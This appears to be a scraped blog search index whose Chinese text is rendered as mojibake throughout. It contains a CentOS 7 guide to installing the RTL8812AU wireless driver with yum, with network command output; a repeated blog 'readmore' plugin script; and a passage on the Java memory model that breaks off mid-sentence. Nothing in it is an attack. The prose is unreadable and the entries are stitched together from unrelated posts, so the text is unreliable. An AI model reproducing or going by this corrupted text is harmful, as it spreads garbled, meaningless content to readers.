ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œé€šè¿‡ä¸Šè¿°çš„æ–¹æ³•ï¼ˆæ‰‹åŠ¨ + DKMSï¼‰å®‰è£… RTL8812AU æ— çº¿ç½‘å¡çš„é©±åŠ¨åï¼Œæ— æ³•ä½¿æ— çº¿ç½‘å¡æ­£å¸¸å·¥ä½œï¼Œå› æ­¤å¯ä»¥é€šè¿‡ YUM åŒ…æ¥å®‰è£…å¯¹åº”çš„ç½‘å¡é©±åŠ¨ã€‚ 12# ç³»ç»Ÿç¯å¢ƒLinux Centos-7 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 1234567# å®‰è£…ç½‘å¡é©±åŠ¨# yum install kmod-rtl8812au# æŸ¥çœ‹ç½‘å¡é©±åŠ¨æ˜¯å¦å®‰è£…æˆåŠŸï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œéœ€è¦å°†æ— çº¿USBç½‘å¡æ’åˆ°ç”µè„‘ä¸Šæ‰ä¼šæ˜¾ç¤ºå…·ä½“çš„é©±åŠ¨ä¿¡æ¯ï¼‰# lsmod| grep "XX"88XXau 2189305 0cfg80211 710816 1 88XXau å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å¸¸ç”¨çš„å‘½ä»¤æ¥åˆ¤æ–­ RTL8812AU æ— çº¿ç½‘å¡æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨ç³»ç»Ÿçš„è®¾ç½®é¢æ¿é‡ŒæŸ¥çœ‹æ— çº¿ç½‘å¡çš„å·¥ä½œçŠ¶æ€ï¼š 1234567891011# ifconfigwlp0s20u5: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500inet 192.168.0.117 netmask 255.255.255.0 broadcast 192.168.0.255inet6 fe80::bbf5:446d:e3ec:90fd prefixlen 64 scopeid 0x20inet6 2606:a000:810c:9300:9c04:74bc:9909:73d prefixlen 64 scopeid 0x0inet6 2606:a000:810c:9300::6 prefixlen 128 scopeid 0x0ether c4:41:1e:5d:7f:98 txqueuelen 1000 (Ethernet)RX packets 1480 bytes 999935 (976.4 KiB)RX errors 0 dropped 0 overruns 0 frame 0TX packets 1724 bytes 484480 (473.1 KiB)TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 12345678910# iwconfigwlp0s20u5 IEEE 802.11AC ESSID:"SBG6900AC" Nickname:"WIFI@REALTEK"Mode:Managed Frequency:5.745 GHz Access Point: 5C:E3:0E:96:D7:A0Bit Rate:174 Mb/s Sensitivity:0/0Retry:off RTS thr:off Fragment thr:offEncryption key:------- Security mode:openPower Management:offLink Quality=83/100 Signal level=36/100 Noise level=0/100Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0Tx excessive retries:0 Invalid misc:0 Missed beacon:0 123# nmcli conNAME UUID TYPE DEVICESBG6900AC fd0097f7-2c89-4a2b-bb8e-a23e5d197ac2 wifi wlp0s20u5 12345# nmcli dev wifiIN-USE SSID MODE CHAN RATE SIGNAL BARS SECURITY TP-LINK_3BC402 Infra 6 270 Mbit/s 47 â–‚â–„__ -- Tenda_F73CF8 Infra 11 130 Mbit/s 37 â–‚â–„__ WPA1 WPA2 Tenda_58D840 Infra 10 130 Mbit/s 14 â–‚___ WPA1 WPA2 å‚è€ƒèµ„æ–™ https://github.com/gnab/rtl8812au https://github.com/gnab/rtl8812au/issues/208 https://github.com/gnab/rtl8812au/issues/115 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux çš„ .aã€.so å’Œ .o æ–‡ä»¶ä»‹ç»",url:"/posts/7d3e2801.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linuxç³»ç»Ÿç¼–ç¨‹"},{title:"æ·±å…¥ç†è§£ Java å†…å­˜æ¨¡å‹",url:"/posts/5bbede3c.html",text:'å‰è¨€æœ¬æ–‡æ¥æºè‡ªã€Šæ·±å…¥ç†è§£ Java è™šæ‹Ÿæœºã€‹ã€‚ ç‰©ç†ç¡¬ä»¶å’Œå†…å­˜é¦–å…ˆï¼Œåœ¨å•æ ¸ç”µè„‘ä¸­å¤„ç†çš„é—®é¢˜è¦ç®€å•å¾—å¤šï¼Œå¯¹å†…å­˜å’Œç¡¬ä»¶çš„è¦æ±‚ï¼Œå„ç§æ–¹é¢çš„è€ƒè™‘æ²¡æœ‰åœ¨å¤šæ ¸çš„æƒ…å†µä¸‹å¤æ‚ã€‚ç”µè„‘ä¸­ï¼ŒCPU çš„è¿è¡Œè®¡ç®—é€Ÿåº¦æ˜¯éå¸¸å¿«çš„ï¼Œè€Œå…¶ä»–ç¡¬ä»¶æ¯”å¦‚ IOï¼Œç½‘ç»œã€å†…å­˜è¯»å–ç­‰ç­‰ï¼Œè·Ÿ CPU çš„é€Ÿåº¦æ¯”èµ·æ¥æ˜¯å·®å‡ ä¸ªæ•°é‡çº§çš„ã€‚è€Œä¸ç®¡ä»»ä½•æ“ä½œï¼Œå‡ ä¹æ˜¯ä¸å¯èƒ½éƒ½åœ¨ CPU ä¸­å®Œæˆè€Œä¸å€ŸåŠ©äºä»»ä½•å…¶ä»–ç¡¬ä»¶æ“ä½œã€‚æ‰€ä»¥åè°ƒ CPU å’Œå„ä¸ªç¡¬ä»¶ä¹‹é—´çš„é€Ÿåº¦å·®å¼‚æ˜¯éå¸¸é‡è¦çš„ï¼Œè¦ä¸ç„¶ CPU å°±ä¸€ç›´åœ¨ç­‰å¾…ï¼Œæµªè´¹èµ„æºã€‚è€Œåœ¨å¤šæ ¸ä¸­ï¼Œä¸ä»…é¢ä¸´å¦‚ä¸Šé—®é¢˜ï¼Œè¿˜æœ‰å¦‚æœå¤šä¸ªæ ¸ç”¨åˆ°äº†åŒä¸€ä¸ªæ•°æ®ï¼Œå¦‚ä½•ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€æ­£ç¡®æ€§ç­‰é—®é¢˜ï¼Œä¹Ÿæ˜¯å¿…é¡»è¦è§£å†³çš„ã€‚ç›®å‰åŸºäºé«˜é€Ÿç¼“å­˜çš„å­˜å‚¨äº¤äº’å¾ˆå¥½çš„è§£å†³äº† CPU å’Œå†…å­˜ç­‰å…¶ä»–ç¡¬ä»¶ä¹‹é—´çš„é€Ÿåº¦çŸ›ç›¾ï¼Œå¤šæ ¸æƒ…å†µä¸‹å„ä¸ªå¤„ç†å™¨ï¼ˆæ ¸ï¼‰éƒ½è¦éµå¾ªä¸€å®šçš„è¯¸å¦‚ MSIã€MESI ç­‰åè®®æ¥ä¿è¯å†…å­˜çš„å„ä¸ªå¤„ç†å™¨é«˜é€Ÿç¼“å­˜å’Œä¸»å†…å­˜çš„æ•°æ®çš„ä¸€è‡´æ€§ã€‚ é™¤äº†å¢åŠ é«˜é€Ÿç¼“å­˜ï¼Œä¸ºäº†ä½¿å¤„ç†å™¨å†…éƒ¨è¿ç®—å•å…ƒå°½å¯èƒ½è¢«å……åˆ†åˆ©ç”¨ï¼Œå¤„ç†å™¨è¿˜ä¼šå¯¹è¾“å…¥çš„ä»£ç è¿›è¡Œä¹±åºæ‰§è¡Œï¼ˆOut-Of-Order Executionï¼‰ä¼˜åŒ–ï¼Œå¤„ç†å™¨ä¼šåœ¨ä¹±åºæ‰§è¡Œä¹‹åçš„ç»“æœè¿›è¡Œé‡ç»„ï¼Œä¿è¯ç»“æœçš„æ­£ç¡®æ€§ï¼Œä¹Ÿå°±æ˜¯ä¿è¯ç»“æœä¸é¡ºåºæ‰§è¡Œçš„ç»“æœä¸€è‡´ã€‚ä½†æ˜¯åœ¨çœŸæ­£çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä»£ç æ‰§è¡Œçš„é¡ºåºå¹¶ä¸ä¸€å®šæŒ‰ç…§ä»£ç çš„ä¹¦å†™é¡ºåºæ¥æ‰§è¡Œï¼Œå¯èƒ½å’Œä»£ç çš„ä¹¦å†™é¡ºåºä¸åŒã€‚ Java çš„å†…å­˜æ¨¡å‹Java å†…å­˜æ¨¡å‹ï¼ˆJava Memory Modelï¼Œç®€ç§° JMMï¼‰æ˜¯ Java è™šæ‹Ÿæœºè§„èŒƒå®šä¹‰çš„ï¼Œç”¨æ¥å±è”½æ‰ Java ç¨‹åºåœ¨å„ç§ä¸åŒçš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿå¯¹å†…å­˜çš„è®¿é—®çš„å·®å¼‚ï¼Œè¿™æ ·å°±å¯ä»¥å®ç° Java ç¨‹åºåœ¨å„ç§ä¸åŒçš„å¹³å°ä¸Šéƒ½èƒ½è¾¾åˆ°å†…å­˜è®¿é—®çš„ä¸€è‡´æ€§ã€‚é¿å…äº†åƒ C++ ç­‰ç›´æ¥ä½¿ç”¨ç‰©ç†ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜æ¨¡å‹åœ¨ä¸åŒæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶å¹³å°ä¸‹è¡¨ç°ä¸åŒï¼Œæ¯”å¦‚æœ‰äº› C/C++ ç¨‹åºå¯èƒ½åœ¨ Windows å¹³å°è¿è¡Œæ­£å¸¸ï¼Œè€Œåœ¨ Linux å¹³å°å´è¿è¡Œæœ‰é—®é¢˜ã€‚ è™½ç„¶ Java ç¨‹åºæ‰€æœ‰çš„è¿è¡Œéƒ½æ˜¯åœ¨è™šæ‹Ÿæœºä¸­ï¼Œæ¶‰åŠåˆ°çš„å†…å­˜ç­‰ä¿¡æ¯éƒ½æ˜¯è™šæ‹Ÿæœºçš„ä¸€éƒ¨åˆ†ï¼Œä½†å®é™…ä¹Ÿæ˜¯ç‰©ç†æœºçš„ï¼Œåªä¸è¿‡æ˜¯è™šæ‹Ÿæœºä½œä¸ºæœ€å¤–å±‚çš„å®¹å™¨ç»Ÿä¸€åšäº†å¤„ç†ã€‚è™šæ‹Ÿæœºçš„å†…å­˜æ¨¡å‹ï¼Œä»¥åŠå¤šçº¿ç¨‹çš„åœºæ™¯ä¸‹ä¸ç‰©ç†æœºçš„æƒ…å†µæ˜¯å¾ˆç›¸ä¼¼çš„ï¼Œå¯ä»¥ç±»æ¯”å‚è€ƒã€‚Java å†…å­˜æ¨¡å‹çš„ä¸»è¦ç›®æ ‡æ˜¯å®šä¹‰ç¨‹åºä¸­å˜é‡çš„è®¿é—®è§„åˆ™ã€‚å³åœ¨è™šæ‹Ÿæœºä¸­å°†å˜é‡å­˜å‚¨åˆ°ä¸»å†…å­˜æˆ–è€…å°†å˜é‡ä»ä¸»å†…å­˜å–å‡ºè¿™æ ·çš„åº•å±‚ç»†èŠ‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„å˜é‡è·Ÿå¹³æ—¶å†™ Java ç¨‹åºä¸­çš„å˜é‡ä¸æ˜¯å®Œå…¨ç­‰åŒçš„ã€‚è¿™é‡Œçš„å˜é‡æ˜¯æŒ‡å®ä¾‹å­—æ®µã€é™æ€å­—æ®µã€æ„æˆæ•°ç»„å¯¹è±¡çš„å…ƒç´ ï¼Œä½†æ˜¯ä¸åŒ…æ‹¬å±€éƒ¨å˜é‡å’Œæ–¹æ³•å‚æ•°ï¼ˆå› ä¸ºè¿™æ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼‰ã€‚è¿™é‡Œå¯ä»¥ç®€å•çš„è®¤ä¸ºä¸»å†…å­˜æ˜¯ Java è™šæ‹Ÿæœºå†…å­˜åŒºåŸŸä¸­çš„å †ï¼Œå±€éƒ¨å˜é‡å’Œæ–¹æ³•å‚æ•°æ˜¯åœ¨è™šæ‹Ÿæœºæ ˆä¸­å®šä¹‰çš„ã€‚ä½†æ˜¯åœ¨å †ä¸­çš„å˜é‡å¦‚æœåœ¨å¤šçº¿ç¨‹ä¸­éƒ½ä½¿ç”¨ï¼Œå°±æ¶‰åŠåˆ°äº†å †å’Œä¸åŒè™šæ‹Ÿæœºæ ˆä¸­å˜é‡çš„å€¼çš„ä¸€è‡´æ€§é—®é¢˜äº†ã€‚ Java å†…å­˜æ¨¡å‹çš„ä¸¤ä¸ªé‡è¦æ¦‚å¿µï¼š ä¸»å†…å­˜ï¼šJava è™šæ‹Ÿæœºè§„å®šæ‰€æœ‰çš„å˜é‡ï¼ˆä¸æ˜¯ç¨‹åºä¸­çš„å˜é‡ï¼‰éƒ½å¿…é¡»åœ¨ä¸»å†…å­˜ä¸­äº§ç”Ÿï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯å †åŒºã€‚å¯ä»¥ä¸å‰é¢è¯´çš„ç‰©ç†æœºçš„ä¸»å†…å­˜ç›¸æ¯”ï¼Œåªä¸è¿‡ç‰©ç†æœºçš„ä¸»å†…å­˜æ˜¯æ•´ä¸ªæœºå™¨çš„å†…å­˜ï¼Œè€Œè™šæ‹Ÿæœºçš„ä¸»å†…å­˜æ˜¯è™šæ‹Ÿæœºå†…å­˜ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ å·¥ä½œå†…å­˜ï¼šJava è™šæ‹Ÿæœºä¸­æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼Œè¯¥å†…å­˜æ˜¯çº¿ç¨‹ç§æœ‰çš„ã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯è™šæ‹Ÿæœºæ ˆï¼Œå¯ä»¥ä¸å‰é¢è¯´çš„é«˜é€Ÿç¼“å­˜ç›¸æ¯”ã€‚çº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¿å­˜äº†çº¿ç¨‹éœ€è¦çš„å˜é‡åœ¨ä¸»å†…å­˜ä¸­çš„å‰¯æœ¬ã€‚è™šæ‹Ÿæœºè§„å®šï¼Œçº¿ç¨‹å¯¹ä¸»å†…å­˜å˜é‡çš„ä¿®æ”¹å¿…é¡»åœ¨çº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­è¿›è¡Œï¼Œä¸èƒ½ç›´æ¥è¯»å†™ä¸»å†…å­˜ä¸­çš„å˜é‡ã€‚ä¸åŒçš„çº¿ç¨‹ä¹‹é—´ä¹Ÿä¸èƒ½ç›¸äº’è®¿é—®å¯¹æ–¹çš„å·¥ä½œå†…å­˜ã€‚å¦‚æœçº¿ç¨‹ä¹‹é—´éœ€è¦ä¼ é€’å˜é‡çš„å€¼ï¼Œå¿…é¡»é€šè¿‡ä¸»å†…å­˜æ¥ä½œä¸ºä¸­ä»‹è¿›è¡Œä¼ é€’ã€‚ ç‰¹åˆ«è¯´æ˜ï¼šä¸»å†…å­˜ã€å·¥ä½œå†…å­˜ä¸ Java å†…å­˜åŒºåŸŸä¸­çš„ Java å †ã€è™šæ‹Ÿæœºæ ˆã€æ–¹æ³•åŒºå¹¶ä¸æ˜¯ä¸€ä¸ªå±‚æ¬¡çš„å†…å­˜åˆ’åˆ†ã€‚è¿™ä¸¤è€…æ˜¯åŸºæœ¬ä¸Šæ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œä¸Šæ–‡åªæ˜¯ä¸ºäº†ä¾¿äºç†è§£ï¼Œåšçš„ç±»æ¯”ã€‚ å·¥ä½œå†…å­˜ä¸ä¸»å†…å­˜äº¤äº’ç‰©ç†æœºé«˜é€Ÿç¼“å­˜å’Œä¸»å†…å­˜ä¹‹é—´æœ‰äº¤äº’åè®®ï¼ŒåŒæ ·çš„ï¼ŒJava å†…å­˜ä¸­çº¿ç¨‹çš„å·¥ä½œå†…å­˜å’Œä¸»å†…å­˜çš„äº¤äº’æ˜¯ç”± Java è™šæ‹Ÿæœºå®šä¹‰äº†å¦‚ä¸‹çš„å…«ç§æ“ä½œæ¥å®Œæˆçš„ï¼Œæ¯ç§æ“ä½œå¿…é¡»æ˜¯åŸå­æ€§çš„ï¼ˆdouble å’Œ long ç±»å‹åœ¨æŸäº›å¹³å°æœ‰ä¾‹å¤–ï¼‰ã€‚Java è™šæ‹Ÿæœºä¸­ä¸»å†…å­˜å’Œå·¥ä½œå†…å­˜äº¤äº’ï¼Œæœ¬è´¨å°±æ˜¯ä¸€ä¸ªå˜é‡å¦‚ä½•ä»ä¸»å†…å­˜ä¼ è¾“åˆ°å·¥ä½œå†…å­˜ä¸­ï¼Œå¦‚ä½•æŠŠä¿®æ”¹åçš„å˜é‡ä»å·¥ä½œå†…å­˜åŒæ­¥å›ä¸»å†…å­˜ã€‚ lockï¼ˆé”å®šï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ï¼Œä¸€ä¸ªå˜é‡åœ¨åŒä¸€æ—¶é—´åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹é”å®šï¼Œè¯¥æ“ä½œè¡¨ç¤ºè¿™æ¡çº¿æˆç‹¬å è¿™ä¸ªå˜é‡ unlockï¼ˆè§£é”ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ï¼Œè¡¨ç¤ºè¿™ä¸ªå˜é‡çš„çŠ¶æ€ç”±å¤„äºé”å®šçŠ¶æ€è¢«é‡Šæ”¾ï¼Œè¿™æ ·å…¶ä»–çº¿ç¨‹æ‰èƒ½å¯¹è¯¥å˜é‡è¿›è¡Œé”å®š readï¼ˆè¯»å–ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜å˜é‡ï¼Œè¡¨ç¤ºæŠŠä¸€ä¸ªä¸»å†…å­˜å˜é‡çš„å€¼ä¼ è¾“åˆ°çº¿ç¨‹çš„å·¥ä½œå†…å­˜ï¼Œä»¥ä¾¿éšåçš„ load æ“ä½œä½¿ç”¨ loadï¼ˆè½½å…¥ï¼‰ï¼šä½œç”¨äºçº¿ç¨‹çš„å·¥ä½œå†…å­˜çš„å˜é‡ï¼Œè¡¨ç¤ºæŠŠ read æ“ä½œä»ä¸»å†…å­˜ä¸­è¯»å–çš„å˜é‡çš„å€¼æ”¾åˆ°å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬ä¸­ï¼ˆå‰¯æœ¬æ˜¯ç›¸å¯¹äºä¸»å†…å­˜çš„å˜é‡è€Œè¨€çš„ï¼‰ useï¼ˆä½¿ç”¨ï¼‰ï¼šä½œç”¨äºçº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œè¡¨ç¤ºæŠŠå·¥ä½œå†…å­˜ä¸­çš„ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“ï¼Œæ¯å½“è™šæ‹Ÿæœºé‡åˆ°ä¸€ä¸ªéœ€è¦ä½¿ç”¨å˜é‡çš„å€¼çš„å­—èŠ‚ç æŒ‡ä»¤æ—¶å°±ä¼šæ‰§è¡Œè¯¥æ“ä½œ assignï¼ˆèµ‹å€¼ï¼‰ï¼šä½œç”¨äºçº¿ç¨‹çš„å·¥ä½œå†…å­˜çš„å˜é‡ï¼Œè¡¨ç¤ºæŠŠæ‰§è¡Œå¼•æ“è¿”å›çš„ç»“æœèµ‹å€¼ç»™å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œæ¯å½“è™šæ‹Ÿæœºé‡åˆ°ä¸€ä¸ªç»™å˜é‡èµ‹å€¼çš„å­—èŠ‚ç æŒ‡ä»¤æ—¶å°±ä¼šæ‰§è¡Œè¯¥æ“ä½œ storeï¼ˆå­˜å‚¨ï¼‰ï¼šä½œç”¨äºçº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼ŒæŠŠå·¥ä½œå†…å­˜ä¸­çš„ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€’ç»™ä¸»å†…å­˜ï¼Œä»¥ä¾¿éšåçš„ write æ“ä½œä½¿ç”¨ writeï¼ˆå†™å…¥ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ï¼ŒæŠŠ store æ“ä½œä»å·¥ä½œå†…å­˜ä¸­å¾—åˆ°çš„å˜é‡çš„å€¼æ”¾å…¥ä¸»å†…å­˜çš„å˜é‡ä¸­ å¦‚æœè¦æŠŠä¸€ä¸ªå˜é‡ä»ä¸»å†…å­˜ä¼ è¾“åˆ°å·¥ä½œå†…å­˜ï¼Œé‚£å°±è¦é¡ºåºçš„æ‰§è¡Œ read å’Œ load æ“ä½œï¼Œå¦‚æœè¦æŠŠä¸€ä¸ªå˜é‡ä»å·¥ä½œå†…å­˜å›å†™åˆ°ä¸»å†…å­˜ï¼Œå°±è¦é¡ºåºçš„æ‰§è¡Œ store å’Œ write æ“ä½œã€‚å¯¹äºæ™®é€šå˜é‡ï¼Œè™šæ‹Ÿæœºåªæ˜¯è¦æ±‚é¡ºåºçš„æ‰§è¡Œï¼Œå¹¶æ²¡æœ‰è¦æ±‚è¿ç»­çš„æ‰§è¡Œï¼Œæ‰€ä»¥å¦‚ä¸‹ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚ä¾‹å¦‚ä¸¤ä¸ªçº¿ç¨‹åˆ†åˆ«ä»ä¸»å†…å­˜ä¸­è¯»å–å˜é‡ a å’Œ b çš„å€¼ï¼Œå³æ‰§è¡Œ read a; load a; read b; load b;ï¼Œæ­¤æ—¶å¯èƒ½ä¹Ÿä¼šå‡ºç°å¦‚ä¸‹æ‰§è¡Œé¡ºåº read a; read b; load b; load a;ã€‚è¿™å…«ç§æ“ä½œå¿…é¡»æ˜¯åŸå­çš„ï¼Œä¸å¯åˆ†å‰²çš„ã€‚ é’ˆå¯¹äº volatile ä¿®é¥°çš„å˜é‡ï¼Œä¼šæœ‰ä¸€äº›ç‰¹æ®Šè§„åˆ™ï¼Œåè¾¹ä¼šè¯¦ç»†åˆ—å‡ºã€‚ å¯¹äºä¸Šè¿°å…«ç§æ“ä½œï¼Œè™šæ‹Ÿæœºä¹Ÿè§„å®šäº†ä¸€ç³»åˆ—è§„åˆ™ï¼Œåœ¨æ‰§è¡Œè¿™å…«ç§æ“ä½œçš„æ—¶å€™å¿…é¡»éµå¾ªå¦‚ä¸‹çš„è§„åˆ™ï¼š ä¸å…è®¸ read å’Œ loadã€store å’Œ write æ“ä½œä¹‹ä¸€å•ç‹¬å‡ºç°ï¼Œä¹Ÿå°±æ˜¯ä¸å…è®¸ä»ä¸»å†…å­˜è¯»å–äº†å˜é‡çš„å€¼ä½†æ˜¯å·¥ä½œå†…å­˜ä¸æ¥æ”¶çš„æƒ…å†µï¼Œæˆ–è€…ä¸å…è®¸ä»å·¥ä½œå†…å­˜å°†å˜é‡çš„å€¼å›å†™åˆ°ä¸»å†…å­˜ä½†æ˜¯ä¸»å†…å­˜ä¸æ¥æ”¶çš„æƒ…å†µ ä¸å…è®¸ä¸€ä¸ªçº¿ç¨‹ä¸¢å¼ƒæœ€è¿‘çš„ assign æ“ä½œï¼Œä¹Ÿå°±æ˜¯ä¸å…è®¸çº¿ç¨‹åœ¨è‡ªå·±çš„å·¥ä½œçº¿ç¨‹ä¸­ä¿®æ”¹äº†å˜é‡çš„å€¼å´ä¸åŒæ­¥ / å›å†™åˆ°ä¸»å†…å­˜ ä¸å…è®¸ä¸€ä¸ªçº¿ç¨‹å›å†™æ²¡æœ‰ä¿®æ”¹çš„å˜é‡åˆ°ä¸»å†…å­˜ï¼Œä¹Ÿå°±æ˜¯å¦‚æœçº¿ç¨‹å·¥ä½œå†…å­˜ä¸­å˜é‡æ²¡æœ‰å‘ç”Ÿè¿‡ä»»ä½• assign æ“ä½œï¼Œæ˜¯ä¸å…è®¸å°†è¯¥å˜é‡çš„å€¼å›å†™åˆ°ä¸»å†…å­˜ å˜é‡åªèƒ½åœ¨ä¸»å†…å­˜ä¸­äº§ç”Ÿï¼Œä¸å…è®¸åœ¨å·¥ä½œå†…å­˜ä¸­ç›´æ¥ä½¿ç”¨ä¸€ä¸ªæœªè¢«åˆå§‹åŒ–çš„å˜é‡ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ‰§è¡Œ load æˆ–è€… assign æ“ä½œï¼Œå³æ‰§è¡Œ useã€store ä¹‹å‰å¿…é¡»å¯¹ç›¸åŒçš„å˜é‡æ‰§è¡Œäº† loadã€assign æ“ä½œ ä¸€ä¸ªå˜é‡åœ¨åŒä¸€æ—¶åˆ»åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹å¯¹å…¶è¿›è¡Œ lock æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªçº¿ç¨‹ä¸€æ—¦å¯¹ä¸€ä¸ªå˜é‡åŠ é”åï¼Œåœ¨è¯¥çº¿ç¨‹æ²¡æœ‰é‡Šæ”¾æ‰é”ä¹‹å‰ï¼Œå…¶ä»–çº¿ç¨‹æ˜¯ä¸èƒ½å¯¹å…¶åŠ é”çš„ï¼Œä½†æ˜¯åŒä¸€ä¸ªçº¿ç¨‹å¯¹ä¸€ä¸ªå˜é‡åŠ é”åï¼Œå¯ä»¥ç»§ç»­åŠ é”ï¼ŒåŒæ—¶åœ¨é‡Šæ”¾é”çš„æ—¶å€™é‡Šæ”¾é”æ¬¡æ•°å¿…é¡»å’ŒåŠ é”æ¬¡æ•°ç›¸åŒ å¯¹å˜é‡æ‰§è¡Œ lock æ“ä½œï¼Œå°±ä¼šæ¸…ç©ºå·¥ä½œå†…å­˜ä¸­è¯¥å˜é‡çš„å€¼ï¼Œæ‰§è¡Œå¼•æ“ä½¿ç”¨è¿™ä¸ªå˜é‡ä¹‹å‰ï¼Œéœ€è¦é‡æ–° load æˆ–è€… assign æ“ä½œåˆå§‹åŒ–å˜é‡çš„å€¼ ä¸å…è®¸å¯¹æ²¡æœ‰ lock çš„å˜é‡æ‰§è¡Œ unlock æ“ä½œï¼Œå¦‚æœä¸€ä¸ªå˜é‡æ²¡æœ‰è¢« lock æ“ä½œï¼Œé‚£ä¹Ÿä¸èƒ½å¯¹å…¶æ‰§è¡Œ unlock æ“ä½œï¼Œå½“ç„¶ä¸€ä¸ªçº¿ç¨‹ä¹Ÿä¸èƒ½å¯¹è¢«å…¶ä»–çº¿ç¨‹ lock çš„å˜é‡æ‰§è¡Œ unlock æ“ä½œ å¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œ unlock ä¹‹å‰ï¼Œå¿…é¡»å…ˆæŠŠå˜é‡åŒæ­¥å›ä¸»å†…å­˜ä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ store å’Œ write æ“ä½œ volatile å˜é‡volatile å˜é‡çš„ç‰¹æ®Šè§„åˆ™å…³é”®å­— volatile å¯ä»¥è¯´æ˜¯ Java è™šæ‹Ÿæœºä¸­æä¾›çš„æœ€è½»é‡çº§çš„åŒæ­¥æœºåˆ¶ï¼ŒJava å†…å­˜æ¨¡å‹å¯¹ volatile ä¸“é—¨å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šçš„è®¿é—®è§„åˆ™ã€‚å‡å®š T è¡¨ç¤ºä¸€ä¸ªçº¿ç¨‹ï¼ŒV å’Œ W åˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ª volatile ä¿®é¥°çš„å˜é‡ï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œ readã€loadã€useã€assignã€store å’Œ write æ“ä½œçš„æ—¶å€™éœ€è¦æ»¡è¶³å¦‚ä¸‹è§„åˆ™ï¼š åªæœ‰å½“çº¿ç¨‹ T å¯¹å˜é‡ V æ‰§è¡Œçš„å‰ä¸€ä¸ªåŠ¨ä½œæ˜¯ loadï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V æ‰èƒ½æ‰§è¡Œ use åŠ¨ä½œï¼›åŒæ—¶åªæœ‰å½“çº¿ç¨‹ T å¯¹å˜é‡ V æ‰§è¡Œçš„åä¸€ä¸ªåŠ¨ä½œæ˜¯ use çš„æ—¶å€™ï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V æ‰èƒ½æ‰§è¡Œ load æ“ä½œã€‚æ‰€ä»¥ï¼Œçº¿ç¨‹ T å¯¹å˜é‡ V çš„ use åŠ¨ä½œå’Œçº¿ç¨‹ T å¯¹å˜é‡ V çš„ readã€load åŠ¨ä½œç›¸å…³è”ï¼Œå¿…é¡»æ˜¯è¿ç»­ä¸€èµ·å‡ºç°ã€‚ä¹Ÿå°±æ˜¯åœ¨çº¿ç¨‹ T 